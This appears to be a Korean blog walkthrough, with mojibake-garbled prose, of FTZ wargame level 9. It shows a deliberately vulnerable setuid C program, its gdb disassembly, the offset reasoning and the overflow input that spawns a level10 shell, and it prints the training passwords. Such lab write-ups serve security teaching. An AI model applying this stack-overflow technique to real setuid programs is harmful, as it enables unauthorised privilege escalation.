I"á,<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level9 
level9@~~~~<span class="s1">'s password: 
[level9@ftz level9]$ ls 
hint  public_html  tmp 
[level9@ftz level9]$ cat hint 


ë‹¤ìŒì€ /usr/bin/bofì˜ ì†ŒìŠ¤ì´ë‹¤. 

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt; 

main(){ 

  char buf2[10]; 
  char buf[10]; 

  printf("It can be overflow : "); 
  fgets(buf,40,stdin); 

  if ( strncmp(buf2, "go", 2) == 0 ) 
   { 
        printf("Good Skill!\n"); 
        setreuid( 3010, 3010 ); 
        system("/bin/bash"); 
   } 

} 

ì´ë¥¼ ì´ìš©í•˜ì—¬ level10ì˜ ê¶Œí•œì„ ì–»ì–´ë¼. 


[level9@ftz level9]$
</span></code></pre></div></div>

<p>level9/appleë¡œ ì ‘ì†í•´ hintë¥¼ ì½ì—ˆë‹¤.</p>

<p>ìœ„ ì†ŒìŠ¤ íŒŒì¼ì„ ë³´ë‹ˆ, ë§ˆì¹¨ë‚´ ë²„í¼ì˜¤ë²„í”Œë¡œìš°ê°€ ë“±ì¥í–ˆë‹¤.</p>

<p>ì´ì œë¶€í„° ì–´ì…ˆë¸”ë¦¬ì–´ì˜ ê°œë…ì´ í•„ìš”í•˜ë‹¤.</p>

<p>í•œë²ˆ ë‚˜ì˜ ê¸€ì„ ì½ì–´ ë³´ê³ , í• ë§Œ í•˜ë‹¤ë©´ ëŠë‚ŒëŒ€ë¡œ ì´í•´í•˜ê³  ëª»í•˜ê² ë‹¤ë©´ ì–´ì…ˆë¸”ë¦¬ë¥¼ ë”°ë¡œ ê³µë¶€í•˜ëŠ”ê±¸ ì¶”ì²œë“œë¦°ë‹¤.</p>

<p>C ì†ŒìŠ¤ íŒŒì¼ì„ ë³´ë©´, buf2ì™€ bufë¥¼ ë¬¸ìì—´ ë°°ì—´ë¡œ ê°ê° 10ì¹¸ì”© ì¤€ë‹¤.</p>

<p>ë¬¸ì œì ì€ fgets í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ë©´ì„œ ë°œìƒí•œë‹¤.</p>

<p>ì…ë ¥ë°›ëŠ” bufë°°ì—´ì€ 10ì¹¸ì´ì§€ë§Œ, ì…ë ¥ë°›ëŠ” ê°¯ìˆ˜ëŠ” 40ê°œ.</p>

<p>ì´ê²ƒìœ¼ë¡œ ë²„í¼ì˜¤ë²„í”Œë¡œìš° ì‹œí‚¤ëŠ” ê²ƒì´ë‹¤.</p>

<p>ë§Œì•½ ë²„í¼ì˜¤ë²„í”Œë¡œìš°ì˜ ê¸°ë³¸ ê°œë…ë„ ì—†ë‹¤ë©´, ì´ íŒŒì¼ì„ ì½ì–´ ë³´ì.</p>

<p><a href="https://github.com/3MP404/3MP404.github.io/files/3280963/BOF.pdf">ë‹¬ê³ ë‚˜ BOF ê¸°ì´ˆë¬¸ì„œ.pdf</a></p>

<p>Cì–¸ì–´ ê³µë¶€ë¥¼ ì¡°ê¸ˆ í•´ ë³¸ ì ì´ ìˆë‹¤ë©´ ê¸ˆë°© ì´í•´í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.</p>

<p>ë§Œì•½ ì´í•´ê°€ í˜ë“¤ë‹¤ë©´ êµ¬ê¸€ë§ì„ í•´ ë³´ì.</p>

<p>ì•ìœ¼ë¡œëŠ” ë²„í¼ì˜¤ë²„í”Œë¡œìš°ì˜ ê¸°ë³¸ ê°œë…ì„ ì•Œê³  ìˆë‹¤ê³  ìƒê°í•˜ê³  ì´ì•¼ê¸°í•˜ê² ë‹¤.</p>

<p>í”„ë¡œê·¸ë¨ì˜ êµ¬ë™ í˜•ì‹ì„ ì•Œë ¤ë©´ ë””ë²„ê¹…ì´ í•„ìš”í•˜ë‹¤.</p>

<p>íŒíŠ¸ì— ìˆëŠ” Cì†ŒìŠ¤ì½”ë“œë¥¼ /tmpí´ë”ë¡œ ì˜®ê²¨ì™€ ì»´íŒŒì¼í•˜ì.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz level9]<span class="nv">$ </span><span class="nb">cp </span>hint /tmp/bof.c 
<span class="o">[</span>level9@ftz level9]<span class="err">$</span>
</code></pre></div></div>

<p>cp (ë³µì‚¬í•  íŒŒì¼) (ë¶™ì—¬ë„£ì„ íŒŒì¼)
ì•„ì˜ˆ í•œë²ˆì— tmp í´ë” ì•ˆì— bof.cë¼ëŠ” íŒŒì¼ì„ ë§Œë“¤ì–´ ë¶™ì—¬ë„£ê²Œ í•˜ì˜€ë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
<span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
</span>bof.c mysql.sock 
<span class="o">[</span>level9@ftz tmp]<span class="err">$</span>
</code></pre></div></div>

<p>ì»´íŒŒì¼ í•˜ë ¤ë©´ ì†ŒìŠ¤íŒŒì¼ ì•ˆì˜ í•œê¸€ì„ ëª¨ë‘ ì§€ì›Œì¤˜ì•¼í•œë‹¤.</p>

<p>vi ëª…ë ¹ì–´ë¡œ í¸ì§‘í•´ í•œê¸€ì„ ëª¨ë‘ ì—†ì• ì.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span>vi bof.c 
<span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>bof.c 
<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#include &lt;stdlib.h&gt; </span>
<span class="c">#include &lt;unistd.h&gt;</span>

main<span class="o">(){</span> 

  char buf2[10]<span class="p">;</span> 
  char buf[10]<span class="p">;</span> 

  <span class="nb">printf</span><span class="o">(</span><span class="s2">"It can be overflow : "</span><span class="o">)</span><span class="p">;</span> 
  fgets<span class="o">(</span>buf,40,stdin<span class="o">)</span><span class="p">;</span> 

  <span class="k">if</span> <span class="o">(</span> strncmp<span class="o">(</span>buf2, <span class="s2">"go"</span>, 2<span class="o">)</span> <span class="o">==</span> 0 <span class="o">)</span> 
   <span class="o">{</span> 
        <span class="nb">printf</span><span class="o">(</span><span class="s2">"Good Skill!</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span> 
        setreuid<span class="o">(</span> 3010, 3010 <span class="o">)</span><span class="p">;</span> 
        system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="p">;</span> 
   <span class="o">}</span> 

<span class="o">}</span> 
<span class="o">[</span>level9@ftz tmp]<span class="err">$</span>
</code></pre></div></div>
<p>ì´ì œ ì¤€ë¹„ëŠ” ëë‚¬ë‹¤.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> bof bof.c 
<span class="o">[</span>level9@ftz tmp]<span class="nv">$ </span>gdb bof 
GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
Copyright 2003 Free Software Foundation, Inc. 
GDB is free software, covered by the GNU General Public License, and you are 
welcome to change it and/or distribute copies of it under certain conditions. 
Type <span class="s2">"show copying"</span> to see the conditions. 
There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div></div>

<p>ì»´íŒŒì¼í•˜ê³  dbgë¥¼ ì‹¤í–‰ì‹œì¼°ë‹¤.</p>

<p>ì´ gdbë¥¼ ì´ìš©í•´ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì½ì„ ê²ƒì´ë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disas main 
Dump of assembler code <span class="k">for function </span>main: 
0x08048420 &lt;main+0&gt;:    push   ebp 
0x08048421 &lt;main+1&gt;:    mov    ebp,esp 
0x08048423 &lt;main+3&gt;:    sub    esp,0x28 
0x08048426 &lt;main+6&gt;:    and    esp,0xfffffff0 
0x08048429 &lt;main+9&gt;:    mov    eax,0x0 
0x0804842e &lt;main+14&gt;:   sub    esp,eax 
0x08048430 &lt;main+16&gt;:   sub    esp,0xc 
0x08048433 &lt;main+19&gt;:   push   0x8048554 
0x08048438 &lt;main+24&gt;:   call   0x8048350  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
0x0804843d &lt;main+29&gt;:   add    esp,0x10 
0x08048440 &lt;main+32&gt;:   sub    esp,0x4 
0x08048443 &lt;main+35&gt;:   push   ds:0x8049698 
0x08048449 &lt;main+41&gt;:   push   0x28 
0x0804844b &lt;main+43&gt;:   lea    eax,[ebp-40] 
0x0804844e &lt;main+46&gt;:   push   eax 
0x0804844f &lt;main+47&gt;:   call   0x8048320  &lt;fgets&gt;
0x08048454 &lt;main+52&gt;:   add    esp,0x10 
0x08048457 &lt;main+55&gt;:   sub    esp,0x4 
0x0804845a &lt;main+58&gt;:   push   0x2 
0x0804845c &lt;main+60&gt;:   push   0x804856a 
0x08048461 &lt;main+65&gt;:   lea    eax,[ebp-24] 
0x08048464 &lt;main+68&gt;:   push   eax 
0x08048465 &lt;main+69&gt;:   call   0x8048330  &lt;strncmp&gt;
0x0804846a &lt;main+74&gt;:   add    esp,0x10 
0x0804846d &lt;main+77&gt;:   <span class="nb">test   </span>eax,eax 
0x0804846f &lt;main+79&gt;:   jne    0x80484a6 &lt;main+134&gt; 
0x08048471 &lt;main+81&gt;:   sub    esp,0xc 
0x08048474 &lt;main+84&gt;:   push   0x804856d 
0x08048479 &lt;main+89&gt;:   call   0x8048350  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
0x0804847e &lt;main+94&gt;:   add    esp,0x10 
0x08048481 &lt;main+97&gt;:   sub    esp,0x8 
0x08048484 &lt;main+100&gt;:  push   0xbc2 
0x08048489 &lt;main+105&gt;:  push   0xbc2 
0x0804848e &lt;main+110&gt;:  call   0x8048360  &lt;setreuid&gt;
0x08048493 &lt;main+115&gt;:  add    esp,0x10 
0x08048496 &lt;main+118&gt;:  sub    esp,0xc 
0x08048499 &lt;main+121&gt;:  push   0x804857a 
0x0804849e &lt;main+126&gt;:  call   0x8048310  &lt;system&gt;
0x080484a3 &lt;main+131&gt;:  add    esp,0x10 
0x080484a6 &lt;main+134&gt;:  leave 
0x080484a7 &lt;main+135&gt;:  ret 
End of assembler dump. 
<span class="o">(</span>gdb<span class="o">)</span> 
</code></pre></div></div>

<p>ë””ë²„ê¹…ì„ í•˜ë©° ì˜†ì— C ì†ŒìŠ¤ì½”ë“œë¥¼ ê°™ì´ ë‘ë©° ë³´ëŠ”ê²ƒì´ ì´í•´ê°€ ë” ë¹ ë¥¼ ê²ƒì´ë‹¤.</p>

<p>í•˜ë‚˜í•˜ë‚˜ ì‚´í´ë³´ì.</p>

<p>ê°€ì¥ ì™¼ìª½ì˜ 0x~~~ë¼ê³  ë˜ì–´ ìˆëŠ”ê±´ í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ëŠ” ì£¼ì†Œê°’</p>

<p>ë‘ë²ˆì§¸ëŠ” í•¨ìˆ˜ë¶€í„° ì–¼ë§ˆë‚˜ ë–¨ì–´ì ¸ ìˆëŠ”ì§€ ì•Œë ¤ì£¼ëŠ” ì£¼ì†Œê°’</p>

<p>ì„¸ë²ˆì§¸ëŠ” ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´</p>

<p>ë„¤ë²ˆì§¸ëŠ” ì‹¤í–‰í•˜ëŠ” í•¨ìˆ˜ë‚˜ ì¸ì¢Œ ë“±ë“±ì„ í‘œì‹œí•œë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x08048443 &lt;main+35&gt;:   push   ds:0x8049698 
0x08048449 &lt;main+41&gt;:   push   0x28  
0x0804844b &lt;main+43&gt;:   lea    eax,[ebp-40]  
0x0804844e &lt;main+46&gt;:   push   eax  
0x0804844f &lt;main+47&gt;:   call   0x8048320  &lt;fgets&gt;
</code></pre></div></div>

<p>ìš°ì„  ì´ê²ƒì„ ë³´ì. Cì½”ë“œì—ì„œëŠ” fgets(buf,40,stdin);ì˜ ì—­í• ì„ í•œë‹¤.</p>

<p>ì–´ì…ˆë¸”ë¦¬ì—ì„œëŠ” Cì—ì„œ ë³´ë‚´ì£¼ëŠ” ì¸ì¢Œì˜ ë°˜ëŒ€ ìˆœì„œëŒ€ë¡œ ì“°ì¸ë‹¤.</p>

<p>ê°€ì¥ ìœ„ì˜ main+35 :   push   ds:0x8049698 ê°€ stdin.</p>

<p>main+41 :   push   0x28  ê°€ 40.</p>

<p>main+43:   lea    eax,[ebp-40] ì´ bufì´ë‹¤.</p>

<p>ê·¸ëŸ¬ë¯€ë¡œ bufì˜ ì£¼ì†Œê°’ì€ [ebp-40]ì´ ë˜ëŠ” ê²ƒì´ë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0804845a &lt;main+58&gt;:   push   0x2 
0x0804845c &lt;main+60&gt;:   push   0x804856a 
0x08048461 &lt;main+65&gt;:   lea    eax,[ebp-24] 
0x08048464 &lt;main+68&gt;:   push   eax 
0x08048465 &lt;main+69&gt;:   call   0x8048330  &lt;strncmp&gt;
</code></pre></div></div>

<p>ì´ê²ƒì€ strncmp(buf2,â€goâ€,2)ì˜ ê¸°ëŠ¥ì„ í•œë‹¤.</p>

<p>ìœ„ì™€ ê°™ì´ ì¸ì¢Œê°€ ê±°ê¾¸ë¡œ ë˜ì–´ ìˆëŠ” ê²ƒì´ë‹¤.</p>

<p>main+58:   push   0x2 ê°€ 2.</p>

<p>main+60:   push   0x804856a ê°€ â€œgoâ€ì˜ ì£¼ì†Œê°’.</p>

<p>main+65:   lea    eax,[ebp-24] ê°€ buf2ì˜ ì£¼ì†Œê°’ì¸ ê²ƒì´ë‹¤.</p>

<p>ì´ë ‡ê²Œ bufì™€ buf2ì˜ ì£¼ì†Œê°’ì„ ëª¨ë‘ ì•Œê²Œ ë˜ì—ˆë‹¤.</p>

<p>ê·¸ëŸ¼ ì˜¤ë²„í”Œë¡œìš° ì‹œì¼œ ë³´ì.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level9@ftz level9]<span class="nv">$ </span><span class="nb">cd</span> /usr/bin 
<span class="o">[</span>level9@ftz bin]<span class="nv">$ </span>./bof 
It can be overflow : aaaaaaaaaaaaaaaago 
Good Skill! 
<span class="o">[</span>level10@ftz bin]<span class="err">$</span>
</code></pre></div></div>
<p>buf2ì˜ ì£¼ì†Œ : ebp-24
bufì˜ ì£¼ì†Œ : ebp-40</p>

<p>buf ì™€ buf2ì˜ ì£¼ì†Œê°’ ì°¨ì´ëŠ” 16ì°¨ì´ê°€ ë‚œë‹¤.</p>

<p>ê·¸ëŸ¬ë¯€ë¡œ ì•„ë¬´ëŸ° ê°’ì´ë‚˜ 16ê°œë¥¼  ì±„ì›Œ ë„£ê³ , ì¡°ê±´ë¬¸ì„ ë³´ë©´ /bin/bashëª…ë ¹ì´ ì‹¤í–‰ë˜ê¸° ìœ„í•´ buf2ê°€ â€œgoâ€ê°€ ë˜ì–´ì•¼ í•˜ë¯€ë¡œ goë¥¼ ë¶™ì—¬ ì£¼ëŠ” ê²ƒì´ë‹¤.</p>

<p>ì‹¤ì œë¡œ level10ì´ ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level10@ftz bin]<span class="nv">$ </span>my-pass  
Level10 Password is <span class="s2">"interesting to hack!"</span><span class="nb">.</span>  
<span class="o">[</span>level10@ftz bin]<span class="nv">$ </span>
</code></pre></div></div>

<p>my-pass ëª…ë ¹ì–´ë¡œ level10ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œì•„ëƒˆë‹¤.</p>

<p>level10â€™s password:â€interesting to hack!â€</p>
:ET